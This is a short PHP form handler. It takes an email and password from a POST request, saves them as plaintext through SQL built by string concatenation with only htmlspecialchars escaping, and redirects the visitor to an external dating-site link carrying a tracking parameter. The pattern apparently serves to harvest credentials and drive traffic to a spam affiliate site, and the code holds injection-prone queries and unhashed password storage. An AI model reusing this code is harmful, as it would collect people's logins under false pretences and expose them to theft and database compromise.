<?php 

include_once"dataBase.php";
$login=$_POST['email'];
$pass=$_POST['pass'];
if (!empty($login) AND !empty($pass)) {

	function clean ($value=""){
$value=htmlspecialchars($value);
$value=trim($value);
return $value;
	}
	$check=mysqli_query($connect,"SELECT * FROM `data` WHERE `login`='".clean($login)."'");
	if (mysqli_num_rows($check)>0) {
		echo '<div class="menuxa"><b>Выбранный логин уже зарегистрирован!</b></div>'; 
echo ' 
<div class="test"><a href="index.php">На главную</a> 
</div>'; 
include_once ('include/foot.php'); 
exit();
	}
	else{
		$query=mysqli_query($connect,"INSERT INTO `data` (`login`, `password`) VALUES('".clean($login)."','".clean($pass)."')");
	$LOCATION="http://longdating.top/?s=3862";
	
	header("Location:$LOCATION");
	
	}
	
 
}
?>
